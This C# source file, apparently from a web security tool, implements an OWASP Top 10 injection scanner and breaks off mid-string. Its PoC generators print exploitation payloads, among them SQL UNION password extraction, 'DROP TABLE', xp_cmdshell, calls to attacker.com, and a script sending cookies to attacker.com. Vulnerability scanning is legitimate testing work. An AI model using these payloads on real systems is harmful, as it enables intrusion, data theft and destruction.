using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Enhanced OWASP Top 10 2025 Vulnerability Scanner with Advanced Payloads
    /// </summary>
    public partial class OWASPT10_2025_ScannerService
    {
        #region Enhanced A05: Injection Testing

        /// <summary>
        /// Comprehensive injection testing with advanced payloads
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestInjectionEnhanced(string url, TrafficEntry originalEntry)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            try
            {
                var parameters = ExtractParameters(url);

                // SQL Injection Testing (Enhanced)
                vulnerabilities.AddRange(await TestSQLInjectionAdvanced(url, parameters));

                // NoSQL Injection Testing (New)
                vulnerabilities.AddRange(await TestNoSQLInjection(url, parameters));

                // XSS Testing (Enhanced with more payloads)
                vulnerabilities.AddRange(await TestXSSAdvanced(url, parameters));

                // Command Injection Testing (Enhanced)
                vulnerabilities.AddRange(await TestCommandInjectionAdvanced(url, parameters));

                // LDAP Injection Testing (Enhanced)
                vulnerabilities.AddRange(await TestLDAPInjectionAdvanced(url, parameters));

                // XXE Testing (New)
                vulnerabilities.AddRange(await TestXXE(url));

                // SSRF Testing (New)
                vulnerabilities.AddRange(await TestSSRF(url, parameters));

                // SSTI Testing (New)
                vulnerabilities.AddRange(await TestSSTI(url, parameters));

                // File Inclusion Testing (New)
                vulnerabilities.AddRange(await TestFileInclusion(url, parameters));

                // CRLF Injection Testing (New)
                vulnerabilities.AddRange(await TestCRLFInjection(url, parameters));
            }
            catch (Exception ex)
            {
                // Log exception and continue
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Advanced SQL Injection testing with multiple techniques
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestSQLInjectionAdvanced(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            foreach (var param in parameters)
            {
                // Test with advanced SQL injection payloads
                var sqlPayloads = AdvancedPayloads.SQLInjectionPayloads.Take(30); // Test first 30 for performance

                foreach (var payload in sqlPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, payload);
                        var result = await TestRequest(testUrl, "GET");

                        // Advanced SQL injection detection
                        if (IsSQLInjectionVulnerableAdvanced(result.Response, result.StatusCode))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = "SQL Injection (Advanced Detection)",
                                Severity = "Critical",
                                Description = $"Advanced SQL Injection vulnerability detected in parameter '{param}' using payload: {payload.Substring(0, Math.Min(50, payload.Length))}...",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"SQL error patterns detected or behavioral anomaly observed",
                                PoC = GenerateSQLInjectionPoCAdvanced(url, param, payload),
                                CWE = "CWE-89"
                            });
                            break; // Found SQL injection for this parameter
                        }
                    }
                    catch { continue; }
                }

                // Time-based blind SQL injection
                var timeBasedResult = await TestTimeBasedSQLInjection(url, param);
                if (timeBasedResult != null)
                {
                    vulnerabilities.Add(timeBasedResult);
                }
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Time-based blind SQL injection detection
        /// </summary>
        private async Task<OWASPT10Vulnerability> TestTimeBasedSQLInjection(string url, string param)
        {
            var timeBasedPayloads = new[]
            {
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SELECT SLEEP(5)--",
                "' AND SLEEP(5)--",
                "' OR IF(1=1,SLEEP(5),0)--"
            };

            foreach (var payload in timeBasedPayloads)
            {
                try
                {
                    var testUrl = ReplaceParameter(url, param, payload);

                    var stopwatch = Stopwatch.StartNew();
                    var result = await TestRequest(testUrl, "GET");
                    stopwatch.Stop();

                    // If response takes longer than 4 seconds, likely vulnerable to time-based injection
                    if (stopwatch.ElapsedMilliseconds > 4000)
                    {
                        return new OWASPT10Vulnerability
                        {
                            Category = "A05:2025 - Injection",
                            Type = "Time-Based Blind SQL Injection",
                            Severity = "Critical",
                            Description = $"Time-based blind SQL injection detected in parameter '{param}'. Response delayed by {stopwatch.ElapsedMilliseconds}ms",
                            TestUrl = testUrl,
                            TestRequest = result.Request,
                            TestResponse = $"Response time: {stopwatch.ElapsedMilliseconds}ms (expected delay: ~5000ms)",
                            Evidence = $"Significant time delay observed: {stopwatch.ElapsedMilliseconds}ms",
                            PoC = GenerateTimeBasedSQLInjectionPoC(url, param, payload, stopwatch.ElapsedMilliseconds),
                            CWE = "CWE-89"
                        };
                    }
                }
                catch { continue; }
            }

            return null;
        }

        /// <summary>
        /// NoSQL Injection testing (MongoDB, CouchDB, etc.)
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestNoSQLInjection(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            foreach (var param in parameters)
            {
                var nosqlPayloads = AdvancedPayloads.NoSQLInjectionPayloads.Take(15);

                foreach (var payload in nosqlPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, payload);
                        var result = await TestRequest(testUrl, "GET");

                        if (IsNoSQLInjectionVulnerable(result.Response, result.StatusCode))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = "NoSQL Injection",
                                Severity = "Critical",
                                Description = $"NoSQL Injection vulnerability detected in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"NoSQL query manipulation detected with payload: {payload}",
                                PoC = GenerateNoSQLInjectionPoC(url, param, payload),
                                CWE = "CWE-943"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Advanced XSS testing with comprehensive payload list
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestXSSAdvanced(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            foreach (var param in parameters)
            {
                var xssPayloads = AdvancedPayloads.XSSPayloads.Take(25); // Test first 25 for performance

                foreach (var payload in xssPayloads)
                {
                    try
                    {
                        var encodedPayload = HttpUtility.UrlEncode(payload);
                        var testUrl = ReplaceParameter(url, param, encodedPayload);
                        var result = await TestRequest(testUrl, "GET");

                        // Check if payload is reflected and not properly encoded
                        if (IsXSSVulnerable(result.Response, payload))
                        {
                            // Determine XSS type
                            var xssType = payload.Contains("{{") || payload.Contains("${")
                                ? "Template Injection XSS"
                                : payload.Contains("onerror") || payload.Contains("onload")
                                    ? "Event Handler XSS"
                                    : "Reflected XSS";

                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = xssType,
                                Severity = "High",
                                Description = $"{xssType} vulnerability detected in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"XSS payload reflected without proper sanitization: {payload.Substring(0, Math.Min(50, payload.Length))}",
                                PoC = GenerateXSSPoCAdvanced(url, param, payload, xssType),
                                CWE = "CWE-79"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Advanced Command Injection testing
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestCommandInjectionAdvanced(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            foreach (var param in parameters)
            {
                var cmdPayloads = AdvancedPayloads.CommandInjectionPayloads.Take(20);

                foreach (var payload in cmdPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, payload);

                        // Time-based detection for blind command injection
                        var stopwatch = Stopwatch.StartNew();
                        var result = await TestRequest(testUrl, "GET");
                        stopwatch.Stop();

                        // Check for command execution evidence
                        if (IsCommandInjectionVulnerableAdvanced(result.Response, stopwatch.ElapsedMilliseconds, payload))
                        {
                            var injectionType = payload.Contains("sleep") || payload.Contains("timeout") || payload.Contains("ping")
                                ? "Time-Based Blind Command Injection"
                                : "Command Injection";

                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = injectionType,
                                Severity = "Critical",
                                Description = $"{injectionType} vulnerability detected in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"Command execution evidence detected. Response time: {stopwatch.ElapsedMilliseconds}ms",
                                PoC = GenerateCommandInjectionPoCAdvanced(url, param, payload),
                                CWE = "CWE-78"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Enhanced LDAP Injection testing
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestLDAPInjectionAdvanced(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            foreach (var param in parameters)
            {
                var ldapPayloads = AdvancedPayloads.LDAPInjectionPayloads;

                foreach (var payload in ldapPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, payload);
                        var result = await TestRequest(testUrl, "GET");

                        if (IsLDAPInjectionVulnerable(result.Response, result.StatusCode))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = "LDAP Injection",
                                Severity = "High",
                                Description = $"LDAP Injection vulnerability detected in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"LDAP filter manipulation detected with payload: {payload}",
                                PoC = GenerateLDAPInjectionPoC(url, param, payload),
                                CWE = "CWE-90"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        #endregion

        #region New: XXE Testing

        /// <summary>
        /// XML External Entity (XXE) Injection testing
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestXXE(string url)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            var xxePayloads = AdvancedPayloads.XXEPayloads.Take(5);

            foreach (var payload in xxePayloads)
            {
                try
                {
                    // Test XXE via POST request with XML content
                    var request = new HttpRequestMessage(HttpMethod.Post, url);
                    request.Content = new StringContent(payload, Encoding.UTF8, "application/xml");

                    var response = await _httpClient.SendAsync(request);
                    var responseBody = await response.Content.ReadAsStringAsync();

                    if (IsXXEVulnerable(responseBody))
                    {
                        vulnerabilities.Add(new OWASPT10Vulnerability
                        {
                            Category = "A05:2025 - Injection",
                            Type = "XML External Entity (XXE) Injection",
                            Severity = "Critical",
                            Description = "XXE vulnerability detected - Server processes external entities",
                            TestUrl = url,
                            TestRequest = $"POST {url}\nContent-Type: application/xml\n\n{payload}",
                            TestResponse = responseBody?.Substring(0, Math.Min(1000, responseBody?.Length ?? 0)),
                            Evidence = "External entity processing detected",
                            PoC = GenerateXXEPoC(url, payload),
                            CWE = "CWE-611"
                        });
                        break;
                    }
                }
                catch { continue; }
            }

            return vulnerabilities;
        }

        #endregion

        #region New: SSRF Testing

        /// <summary>
        /// Server-Side Request Forgery (SSRF) testing
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestSSRF(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            // Common SSRF parameter names
            var ssrfParamNames = new[] { "url", "uri", "path", "dest", "redirect", "return", "link", "file", "document", "folder", "root", "pg", "page" };

            foreach (var param in parameters)
            {
                if (!ssrfParamNames.Any(name => param.ToLower().Contains(name)))
                    continue;

                var ssrfPayloads = AdvancedPayloads.SSRFPayloads.Take(10);

                foreach (var payload in ssrfPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, HttpUtility.UrlEncode(payload));
                        var result = await TestRequest(testUrl, "GET");

                        if (IsSSRFVulnerable(result.Response, payload))
                        {
                            var ssrfType = payload.Contains("169.254.169.254") || payload.Contains("metadata")
                                ? "SSRF - Cloud Metadata Access"
                                : payload.Contains("localhost") || payload.Contains("127.0.0.1")
                                    ? "SSRF - Internal Network Access"
                                    : "Server-Side Request Forgery (SSRF)";

                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = ssrfType,
                                Severity = "Critical",
                                Description = $"{ssrfType} detected in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"Server made request to internal/external resource: {payload}",
                                PoC = GenerateSSRFPoC(url, param, payload),
                                CWE = "CWE-918"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        #endregion

        #region New: SSTI Testing

        /// <summary>
        /// Server-Side Template Injection (SSTI) testing
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestSSTI(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            foreach (var param in parameters)
            {
                var sstiPayloads = AdvancedPayloads.SSTIPayloads.Take(15);

                foreach (var payload in sstiPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, HttpUtility.UrlEncode(payload));
                        var result = await TestRequest(testUrl, "GET");

                        if (IsSSTIVulnerable(result.Response, payload))
                        {
                            var templateEngine = DetectTemplateEngine(payload);

                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = $"Server-Side Template Injection (SSTI) - {templateEngine}",
                                Severity = "Critical",
                                Description = $"SSTI vulnerability detected in parameter '{param}' using {templateEngine} template engine",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"Template injection detected with payload: {payload}",
                                PoC = GenerateSSTIPoC(url, param, payload, templateEngine),
                                CWE = "CWE-94"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        #endregion

        #region New: File Inclusion Testing

        /// <summary>
        /// Local/Remote File Inclusion testing
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestFileInclusion(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            // Common file inclusion parameter names
            var lfiParamNames = new[] { "file", "path", "page", "include", "dir", "document", "folder", "pg", "style", "template" };

            foreach (var param in parameters)
            {
                if (!lfiParamNames.Any(name => param.ToLower().Contains(name)))
                    continue;

                var lfiPayloads = AdvancedPayloads.FileInclusionPayloads.Take(15);

                foreach (var payload in lfiPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, HttpUtility.UrlEncode(payload));
                        var result = await TestRequest(testUrl, "GET");

                        if (IsFileInclusionVulnerable(result.Response, payload))
                        {
                            var inclusionType = payload.StartsWith("http://") || payload.StartsWith("https://") || payload.StartsWith("ftp://")
                                ? "Remote File Inclusion (RFI)"
                                : payload.Contains("php://") || payload.Contains("data://") || payload.Contains("expect://")
                                    ? "PHP Wrapper File Inclusion"
                                    : "Local File Inclusion (LFI)";

                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = inclusionType,
                                Severity = "Critical",
                                Description = $"{inclusionType} vulnerability detected in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"File inclusion detected with payload: {payload}",
                                PoC = GenerateFileInclusionPoC(url, param, payload, inclusionType),
                                CWE = inclusionType.Contains("Remote") ? "CWE-98" : "CWE-22"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        #endregion

        #region New: CRLF Injection Testing

        /// <summary>
        /// CRLF (Carriage Return Line Feed) Injection testing
        /// </summary>
        private async Task<List<OWASPT10Vulnerability>> TestCRLFInjection(string url, List<string> parameters)
        {
            var vulnerabilities = new List<OWASPT10Vulnerability>();

            foreach (var param in parameters)
            {
                var crlfPayloads = AdvancedPayloads.CRLFInjectionPayloads.Take(5);

                foreach (var payload in crlfPayloads)
                {
                    try
                    {
                        var testUrl = ReplaceParameter(url, param, payload);
                        var result = await TestRequestWithHeaders(testUrl, "GET");

                        if (IsCRLFInjectionVulnerable(result.Headers, payload))
                        {
                            vulnerabilities.Add(new OWASPT10Vulnerability
                            {
                                Category = "A05:2025 - Injection",
                                Type = "CRLF Injection / HTTP Response Splitting",
                                Severity = "High",
                                Description = $"CRLF Injection vulnerability detected in parameter '{param}'",
                                TestUrl = testUrl,
                                TestRequest = result.Request,
                                TestResponse = result.Response?.Substring(0, Math.Min(1000, result.Response?.Length ?? 0)),
                                Evidence = $"HTTP header injection detected with payload: {payload}",
                                PoC = GenerateCRLFInjectionPoC(url, param, payload),
                                CWE = "CWE-93"
                            });
                            break;
                        }
                    }
                    catch { continue; }
                }
            }

            return vulnerabilities;
        }

        #endregion

        #region Advanced Detection Methods

        /// <summary>
        /// Advanced SQL injection detection with multiple indicators
        /// </summary>
        private bool IsSQLInjectionVulnerableAdvanced(string response, int statusCode)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            var sqlErrorPatterns = new[]
            {
                // MySQL
                "SQL syntax.*MySQL", "Warning.*mysql_", "valid MySQL result", "MySqlClient\\.",
                "com\\.mysql\\.jdbc", "Syntax error.*SQL",

                // PostgreSQL
                "PostgreSQL.*ERROR", "Warning.*\\Wpg_", "valid PostgreSQL result", "Npgsql\\.",
                "PG::SyntaxError", "org\\.postgresql\\.util\\.PSQLException",

                // Microsoft SQL Server
                "Driver.*SQL[\\-\\_\\ ]*Server", "OLE DB.*SQL Server", "\\bSQL Server[^&lt;&quot;]+Driver",
                "Warning.*mssql_", "Microsoft SQL Native Client error",
                "ODBC SQL Server Driver", "SQLServer JDBC Driver", "macromedia\\.jdbc\\.sqlserver",

                // Oracle
                "ORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*Driver",
                "Warning.*\\Woci_", "Warning.*\\Wora_",

                // JDBC
                "java\\.sql\\.SQLException", "Unexpected end of command in statement",

                // SQLite
                "SQLite/JDBCDriver", "SQLite\\.Exception", "System\\.Data\\.SQLite\\.SQLiteException",

                // General SQL errors
                "syntax error", "unterminated quoted string", "unexpected end of SQL command",
                "SQLSTATE", "SQLException", "Unclosed quotation mark"
            };

            foreach (var pattern in sqlErrorPatterns)
            {
                if (Regex.IsMatch(response, pattern, RegexOptions.IgnoreCase))
                    return true;
            }

            // Check for significant response differences (boolean-based)
            if (response.Length < 100 && (statusCode == 500 || statusCode == 200))
                return true;

            return false;
        }

        /// <summary>
        /// NoSQL injection detection
        /// </summary>
        private bool IsNoSQLInjectionVulnerable(string response, int statusCode)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            var nosqlErrorPatterns = new[]
            {
                "MongoError", "MongoDB", "CouchDB", "RavenDB",
                "\\$where", "\\$ne", "\\$gt", "\\$lt",
                "SyntaxError.*unexpected token", "BSON",
                "query failed", "mongo.*exception",
                "invalid operator", "Cassandra"
            };

            return nosqlErrorPatterns.Any(pattern =>
                Regex.IsMatch(response, pattern, RegexOptions.IgnoreCase));
        }

        /// <summary>
        /// Advanced XSS detection
        /// </summary>
        private bool IsXSSVulnerable(string response, string payload)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            // Check if payload is reflected without encoding
            if (response.Contains(payload, StringComparison.Ordinal))
                return true;

            // Check for partial reflection (tag without encoding)
            var dangerousTags = new[] { "<script", "<img", "<svg", "<iframe", "<body", "<object", "<embed" };
            if (dangerousTags.Any(tag => payload.Contains(tag, StringComparison.OrdinalIgnoreCase) &&
                response.Contains(tag, StringComparison.OrdinalIgnoreCase)))
                return true;

            // Check for JavaScript event handlers
            var eventHandlers = new[] { "onerror", "onload", "onclick", "onmouseover", "onfocus" };
            if (eventHandlers.Any(handler => payload.Contains(handler, StringComparison.OrdinalIgnoreCase) &&
                response.Contains(handler, StringComparison.OrdinalIgnoreCase)))
                return true;

            // Check for template injection results
            if (payload.Contains("{{") && response.Contains("49")) // 7*7 = 49
                return true;

            if (payload.Contains("${") && response.Contains("49"))
                return true;

            return false;
        }

        /// <summary>
        /// Advanced command injection detection
        /// </summary>
        private bool IsCommandInjectionVulnerableAdvanced(string response, long responseTime, string payload)
        {
            // Time-based detection
            if ((payload.Contains("sleep") || payload.Contains("timeout") || payload.Contains("ping")) &&
                responseTime > 4000)
                return true;

            if (string.IsNullOrEmpty(response))
                return false;

            // Output-based detection
            var commandOutputPatterns = new[]
            {
                "root:", "bin/bash", "uid=", "gid=", "groups=",
                "Volume Serial Number", "Directory of", "Windows",
                "/etc/passwd", "/bin/sh", "total [0-9]+",
                "drwx", "-rw-", "nobody", "daemon"
            };

            return commandOutputPatterns.Any(pattern =>
                Regex.IsMatch(response, pattern, RegexOptions.IgnoreCase));
        }

        /// <summary>
        /// LDAP injection detection
        /// </summary>
        private bool IsLDAPInjectionVulnerable(string response, int statusCode)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            var ldapErrorPatterns = new[]
            {
                "javax\\.naming\\.directory", "LDAPException", "com\\.sun\\.jndi\\.ldap",
                "Invalid DN syntax", "LDAP.*error", "javax\\.naming\\.NamingException",
                "LdapErr", "Protocol error"
            };

            return ldapErrorPatterns.Any(pattern =>
                Regex.IsMatch(response, pattern, RegexOptions.IgnoreCase));
        }

        /// <summary>
        /// XXE vulnerability detection
        /// </summary>
        private bool IsXXEVulnerable(string response)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            // Check for typical file content disclosure
            var xxeIndicators = new[]
            {
                "root:x:", "/etc/passwd", "win.ini", "[boot loader]",
                "<!DOCTYPE", "<!ENTITY", "System.IO", "java.io"
            };

            return xxeIndicators.Any(indicator => response.Contains(indicator));
        }

        /// <summary>
        /// SSRF vulnerability detection
        /// </summary>
        private bool IsSSRFVulnerable(string response, string payload)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            // Check for cloud metadata
            if (payload.Contains("169.254.169.254") || payload.Contains("metadata"))
            {
                if (response.Contains("ami-id") || response.Contains("instance-id") ||
                    response.Contains("hostname") || response.Contains("credentials"))
                    return true;
            }

            // Check for localhost/internal network access
            if (payload.Contains("localhost") || payload.Contains("127.0.0.1"))
            {
                if (response.Contains("Apache") || response.Contains("nginx") ||
                    response.Contains("Connection established"))
                    return true;
            }

            // Check for file protocol
            if (payload.StartsWith("file://"))
            {
                if (response.Contains("root:") || response.Contains("win.ini"))
                    return true;
            }

            return false;
        }

        /// <summary>
        /// SSTI vulnerability detection
        /// </summary>
        private bool IsSSTIVulnerable(string response, string payload)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            // Check for template evaluation
            if (payload.Contains("{{7*7}}") && response.Contains("49"))
                return true;

            if (payload.Contains("${7*7}") && response.Contains("49"))
                return true;

            if (payload.Contains("<%= 7*7 %>") && response.Contains("49"))
                return true;

            // Check for template engine errors
            var sstiErrorPatterns = new[]
            {
                "TemplateSyntaxError", "jinja2", "Twig_Error", "FreeMarker",
                "Velocity", "Smarty", "Thymeleaf", "erb", "Template",
                "UndefinedError", "SecurityError", "TemplateNotFound"
            };

            return sstiErrorPatterns.Any(pattern =>
                Regex.IsMatch(response, pattern, RegexOptions.IgnoreCase));
        }

        /// <summary>
        /// File inclusion vulnerability detection
        /// </summary>
        private bool IsFileInclusionVulnerable(string response, string payload)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            // LFI detection
            if (payload.Contains("/etc/passwd") && response.Contains("root:x:"))
                return true;

            if (payload.Contains("win.ini") && (response.Contains("[fonts]") || response.Contains("[extensions]")))
                return true;

            // PHP wrapper detection
            if (payload.Contains("php://filter") && response.Contains("PD9waHA")) // Base64 "<?php"
                return true;

            // Check for file disclosure patterns
            var fileDisclosurePatterns = new[]
            {
                "<?php", "#!/", "root:", "define\\(", "include\\(",
                "require\\(", "<?=", "namespace ", "use "
            };

            return fileDisclosurePatterns.Any(pattern =>
                Regex.IsMatch(response, pattern, RegexOptions.IgnoreCase));
        }

        /// <summary>
        /// CRLF injection detection
        /// </summary>
        private bool IsCRLFInjectionVulnerable(Dictionary<string, string> headers, string payload)
        {
            if (headers == null || headers.Count == 0)
                return false;

            // Check if injected headers appear
            if (payload.Contains("Set-Cookie") && headers.Any(h => h.Key.Equals("Set-Cookie", StringComparison.OrdinalIgnoreCase)))
                return true;

            if (payload.Contains("Location") && headers.Any(h => h.Key.Equals("Location", StringComparison.OrdinalIgnoreCase)))
                return true;

            if (payload.Contains("X-XSS-Protection") && headers.Any(h => h.Key.Equals("X-XSS-Protection", StringComparison.OrdinalIgnoreCase)))
                return true;

            return false;
        }

        /// <summary>
        /// Detect template engine from payload
        /// </summary>
        private string DetectTemplateEngine(string payload)
        {
            if (payload.Contains("{{") || payload.Contains("jinja2"))
                return "Jinja2 (Python)";
            if (payload.Contains("_self.env"))
                return "Twig (PHP)";
            if (payload.Contains("freemarker"))
                return "FreeMarker (Java)";
            if (payload.Contains("${T(") || payload.Contains("Thymeleaf"))
                return "Thymeleaf (Java)";
            if (payload.Contains("<%= ") || payload.Contains("<%="))
                return "ERB (Ruby)";
            if (payload.Contains("#set("))
                return "Velocity (Java)";
            if (payload.Contains("{system"))
                return "Smarty (PHP)";
            if (payload.Contains("#{global.process"))
                return "Jade/Pug (Node.js)";

            return "Unknown";
        }

        #endregion

        #region PoC Generators (Enhanced)

        private string GenerateSQLInjectionPoCAdvanced(string url, string param, string payload)
        {
            return $@"Advanced SQL Injection PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

Attack Vector:
   {ReplaceParameter(url, param, payload)}

Advanced Exploitation Steps:

1. Database Enumeration:
   Payload: ' UNION SELECT @@version, database(), user()--
   Purpose: Identify database type and version

2. Table Discovery:
   MySQL: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
   MSSQL: ' UNION SELECT name FROM sys.tables--
   PostgreSQL: ' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--

3. Column Enumeration:
   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

4. Data Extraction:
   ' UNION SELECT username, password FROM users--

5. Advanced Techniques:
   - Time-Based Blind: ' AND IF(1=1, SLEEP(5), 0)--
   - Boolean-Based: ' AND (SELECT COUNT(*) FROM users)>10--
   - Error-Based: ' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
   - Stacked Queries: '; DROP TABLE users--
   - Out-of-band: '; EXEC xp_dirtree '\\\\attacker.com\\a'--

6. Database-Specific Payloads:
   MySQL: ' UNION SELECT LOAD_FILE('/etc/passwd')--
   MSSQL: '; EXEC xp_cmdshell('whoami')--
   PostgreSQL: '; COPY users TO PROGRAM 'curl http://attacker.com'--
   Oracle: ' UNION SELECT banner FROM v$version--

Impact:
   - Complete database compromise
   - Sensitive data extraction (passwords, credit cards, PII)
   - Data modification/deletion
   - Potential remote code execution
   - Server takeover via xp_cmdshell (MSSQL)

Remediation:
   - Use parameterized queries/prepared statements
   - Implement ORM frameworks
   - Apply principle of least privilege
   - Input validation and output encoding
   - Web Application Firewall (WAF)
   - Regular security audits";
        }

        private string GenerateTimeBasedSQLInjectionPoC(string url, string param, string payload, long responseTime)
        {
            return $@"Time-Based Blind SQL Injection PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}
Response Time: {responseTime}ms (Expected: ~5000ms)

Exploitation Steps:

1. Confirm Vulnerability:
   Payload: ' AND SLEEP(5)--
   Expected Delay: 5 seconds

2. Extract Database Name (Binary Search):
   ' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0)--

3. Extract Table Names:
   ' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, SLEEP(5), 0)--

4. Extract Data Character by Character:
   ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0)--

5. Automated Extraction Script:
   Use sqlmap: sqlmap -u ""{url}"" -p ""{param}"" --technique=T

Impact: Full database compromise through blind extraction

Remediation:
   - Use parameterized queries
   - Implement query timeout limits
   - Monitor for unusual response times";
        }

        private string GenerateNoSQLInjectionPoC(string url, string param, string payload)
        {
            return $@"NoSQL Injection PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

MongoDB Injection Examples:

1. Authentication Bypass:
   username[$ne]=invalid&password[$ne]=invalid
   {{"username": {{"$ne": null}}, "password": {{"$ne": null}}}}

2. Data Extraction:
   username[$regex]=.*&password[$ne]=invalid

3. JavaScript Injection:
   username=admin'}}; return true; var dummy={{'&password=any

4. Blind NoSQL Injection:
   username=admin' && this.password.match(/^a/)//&password=any

5. Operator Abuse:
   username[$gt]=&password[$gt]=

Advanced Attacks:
   - Use $where operator for arbitrary JavaScript execution
   - Extract data using regex enumeration
   - Timing attacks using sleep()

Impact:
   - Authentication bypass
   - Unauthorized data access
   - Data modification
   - Possible remote code execution

Remediation:
   - Validate and sanitize all inputs
   - Never use user input directly in queries
   - Disable JavaScript execution ($where operator)
   - Use MongoDB's built-in validation
   - Implement proper access controls";
        }

        private string GenerateXSSPoCAdvanced(string url, string param, string payload, string xssType)
        {
            return $@"{xssType} PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

Attack Scenarios:

1. Session Hijacking:
   <script>document.location='http://attacker.com/steal?c='+document.cookie</script>

2. Keylogging:
